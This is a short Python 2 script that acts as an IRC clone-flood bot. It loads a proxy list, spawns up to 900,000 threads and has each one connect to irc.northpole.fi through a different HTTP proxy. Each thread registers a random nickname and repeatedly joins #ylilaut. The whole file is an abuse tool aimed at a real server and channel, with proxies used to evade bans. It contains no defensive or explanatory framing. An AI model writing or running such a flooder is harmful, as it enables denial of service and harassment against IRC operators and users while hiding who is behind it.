import socks
import random
import threading
import time
import string
import inspect_shell
import sys

server = "irc.northpole.fi"
port = 6667
proxylist = "proxy.txt"

channels = ["#ylilaut"]
cmd = ""
delay = 3
i = 0
fil = open(proxylist, "r")
lines = fil.readlines()
fil.close()
random.shuffle(lines)

class MyThread(threading.Thread):
	def run(self):
		number = random.randint(1,99999)
		ircsock = socks.socksocket()

		choice = proxy.split(":")

		pport = choice[1]
		pserver = choice[0]

		lol = 1
		pport = pport.replace("\n", "")
		spam = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
		try:
			ircsock.setproxy(socks.PROXY_TYPE_HTTP, pserver, int(pport))
			ircsock.connect((server, port))
			ircsock.send("USER "+ nick +" "+ nick +" "+ nick +" :"+ nick +"\n")
			ircsock.send("NICK p"+ nick +"\n")
			while 1:
				ircmsg = ircsock.recv(1024)
				ircmsg = ircmsg.strip('\n\r')
				ircmsg = ircmsg.lower()
				number = random.randint(5, 30)
				chn = random.choice(channels)
				print ircmsg
 			

				if ircmsg.find("ping :") != -1:
					if ircmsg.find("timeout") != -1 or ircmsg.find("quit") != -1:
						print("beep")
					
					else:
						ping = ircmsg.split("ping :")
						ircsock.send("PONG "+ ping[1] +"\n")
#						ircsock.send("JOIN "+ chn +"\n")
                                                


				ircsock.send("JOIN "+chn+"\n")
				time.sleep(2.5)
		except:
			time.sleep(5)

for x in xrange(900000):
	nicklength = random.randint(3,4)
	number = random.randint(1,99999)
	nick = "".join(random.choice(string.letters) for _ in range(nicklength))
	
	proxy = lines[i]
	
	print(i)
	i = i + 1
	
	MyThread().start()
	time.sleep(0.01)

